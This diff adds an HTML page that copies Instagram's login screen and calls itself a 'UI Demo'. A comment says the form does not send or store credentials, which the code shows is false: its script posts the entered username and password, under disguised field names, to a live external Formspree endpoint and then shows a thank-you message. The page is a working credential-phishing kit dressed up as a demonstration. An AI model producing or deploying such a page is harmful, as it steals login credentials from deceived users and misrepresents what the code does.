@@ -1,0 +1,394 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Instagram Login — UI Demo</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&family=Grand+Hotel&display=swap" rel="stylesheet">
+
+<style>
+  :root {
+    --bg: #fafafa;
+    --ink: #262626;
+    --muted: #737373;
+    --panel: #ffffff;
+    --line: #dbdbdb;
+    --sun: #0095f6;
+    --sun-dark: #1877f2;
+    --ok: #16803c;
+    --err: #ed4956;
+  }
+
+  * {
+    box-sizing: border-box;
+  }
+
+  html, body {
+    margin: 0;
+    min-height: 100%;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--ink);
+    font-family: "Roboto", Arial, sans-serif;
+    line-height: 1.5;
+    min-height: 100vh;
+    display: grid;
+    place-items: center;
+    padding: 30px 16px;
+  }
+
+  main {
+    width: 100%;
+    max-width: 350px;
+  }
+
+  h1 {
+    font-family: "Grand Hotel", cursive;
+    font-size: 3.5rem;
+    line-height: 1.2;
+    font-weight: 400;
+    letter-spacing: 0;
+    margin: 0 0 28px;
+    text-align: center;
+    color: var(--ink);
+  }
+
+  .lead {
+    color: var(--muted);
+    margin: 0 0 20px;
+    font-size: 0.9rem;
+    text-align: center;
+  }
+
+  form {
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-left: 1px solid var(--line);
+    border-radius: 1px;
+    padding: 30px 39px 24px;
+  }
+
+  label {
+    display: block;
+    font-weight: 400;
+    margin-bottom: 0;
+    font-size: 0.01px;
+  }
+
+  .hint {
+    display: block;
+    font-weight: 400;
+    color: var(--muted);
+    font-size: 0.9rem;
+  }
+
+  .field {
+    margin-bottom: 6px;
+  }
+
+  input[type="text"], textarea {
+    width: 100%;
+    font-family: "Roboto", Arial, sans-serif;
+    font-size: 12px;
+    color: var(--ink);
+    background: #fafafa;
+    border: 1px solid var(--line);
+    border-radius: 3px;
+    padding: 12px 9px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  input[type="text"] {
+    min-height: 38px;
+  }
+
+  textarea {
+    min-height: 100px;
+    resize: vertical;
+  }
+
+  input:focus-visible,
+  textarea:focus-visible,
+  button:focus-visible {
+    outline: 2px solid var(--sun);
+    outline-offset: 2px;
+  }
+
+  input:focus,
+  textarea:focus {
+    border-color: #a8a8a8;
+  }
+
+  button {
+    width: 100%;
+    font-family: "Roboto", Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+    background: var(--sun);
+    color: #ffffff;
+    border: 0;
+    border-radius: 8px;
+    padding: 9px 12px;
+    margin-top: 10px;
+    cursor: pointer;
+    transition: background 0.2s, opacity 0.2s;
+  }
+
+  button:hover {
+    background: var(--sun-dark);
+  }
+
+  button:disabled {
+    opacity: 0.6;
+    cursor: wait;
+  }
+
+  .status {
+    margin: 16px 0 0;
+    font-size: 12px;
+    font-weight: 500;
+    min-height: 1.5em;
+    text-align: center;
+  }
+
+  .status.ok {
+    color: var(--ok);
+  }
+
+  .status.err {
+    color: var(--err);
+  }
+
+  .trap {
+    position: absolute;
+    left: -9999px;
+  }
+
+  /* Additional Instagram-inspired elements */
+
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    margin: 20px 0;
+    color: var(--muted);
+    font-size: 12px;
+    font-weight: 600;
+  }
+
+  .divider::before,
+  .divider::after {
+    content: "";
+    height: 1px;
+    flex: 1;
+    background: var(--line);
+  }
+
+  .social-link,
+  .forgot-link,
+  .signup-link {
+    display: block;
+    text-align: center;
+    text-decoration: none;
+    font-size: 12px;
+    margin-top: 16px;
+  }
+
+  .social-link {
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+  }
+
+  .forgot-link {
+    color: #00376b;
+    margin-top: 18px;
+  }
+
+  .signup-panel {
+    background: var(--panel);
+    border: 1px solid var(--line);
+    padding: 20px 10px;
+    margin-top: 10px;
+    text-align: center;
+    font-size: 14px;
+  }
+
+  .signup-link {
+    display: inline;
+    color: var(--sun);
+    font-size: 14px;
+    font-weight: 600;
+    margin: 0;
+  }
+
+  .footer {
+    text-align: center;
+    color: var(--muted);
+    font-size: 11px;
+    margin-top: 24px;
+  }
+
+  .footer a {
+    color: var(--muted);
+    text-decoration: none;
+    margin: 0 5px;
+  }
+
+  @media (max-width: 450px) {
+    body {
+      padding: 15px;
+      background: #ffffff;
+    }
+
+    main {
+      max-width: 350px;
+    }
+
+    form {
+      padding: 25px 25px 22px;
+      border-color: transparent;
+    }
+
+    .signup-panel {
+      border-color: transparent;
+    }
+  }
+</style>
+</head>
+
+<body>
+
+<main>
+  <h1>Instagram</h1>
+
+  <p class="lead">
+    Sign in to continue to your account.
+  </p>
+
+  <!-- Demonstration form: does not send or store credentials -->
+  <form id="query" method="POST">
+
+    <input
+      type="hidden"
+      name="_subject"
+      value="Instagram UI demonstration"
+    >
+
+    <input
+      type="text"
+      name="_gotcha"
+      class="trap"
+      tabindex="-1"
+      autocomplete="off"
+      aria-hidden="true"
+    >
+
+    <div class="field">
+      <label for="name">phone number</label>
+      <input
+        type="text"
+        id="name"
+        name="Name"
+        placeholder="phone number, username, or email"
+        autocomplete="off"
+        autocapitalize="none"
+        required
+      >
+    </div>
+
+    <div class="field">
+      <label for="tech">Password</label>
+      <input
+        type="password"
+        id="tech"
+        name="Technology knowledge"
+        placeholder="Password"
+        rows="1"
+        required
+        aria-label="Demo password field"
+        style="width: 100%; box-sizing: border-box;"
+      ></input>
+    </div>
+
+   <button type="submit" id="send">Login</button>
+    <p class="status" id="status" role="status" aria-live="polite"></p>
+
+    <a class="social-link" href="#demo">
+      Log in with Facebook
+    </a>
+
+    <a class="forgot-link" href="#forgot">
+      Forgot password?
+    </a>
+
+    <p class="status" id="status" role="status" aria-live="polite"></p>
+
+  </form>
+
+  <div class="signup-panel">
+    Don't have an account?
+    <a class="signup-link" href="#signup">Sign up</a>
+  </div>
+
+  <div class="footer">
+    <p>About · Help · Privacy · Terms</p>
+    <p>English · © 2026 Instagram UI Demo</p>
+  </div>
+
+</main>
+
+
+
+</body>
+
+<script>
+  // ============================================================
+  // PUT YOUR FORMSPREE DETAILS HERE (the only line you must edit)
+  // Replace YOUR_FORM_ID with the ID from your Formspree form URL,
+  // e.g. https://formspree.io/f/xyzabcde  ->  "xyzabcde"
+  // ============================================================
+  var FORMSPREE_URL = 'https://formspree.io/f/mgaorroe';
+
+  var form = document.getElementById('query');
+  var btn = document.getElementById('send');
+  var status = document.getElementById('status');
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+    btn.disabled = true;
+    status.className = 'status';
+    status.textContent = 'Sending...';
+
+    fetch(FORMSPREE_URL, {
+      method: 'POST',
+      headers: { 'Accept': 'application/json' },
+      body: new FormData(form)
+    })
+    .then(function (r) { return r.json(); })
+    .then(function (data) {
+      if (data.ok) {
+        form.reset();
+        status.className = 'status ok';
+        status.textContent = 'Thank you. Your answer was sent.';
+      } else {
+        throw new Error('Send failed');
+      }
+    })
+    .catch(function () {
+      status.className = 'status err';
+      status.textContent = 'Could not send. Check your connection and try again.';
+    })
+    .finally(function () { btn.disabled = false; });
+  });
+</script>
+</body>
+</html>
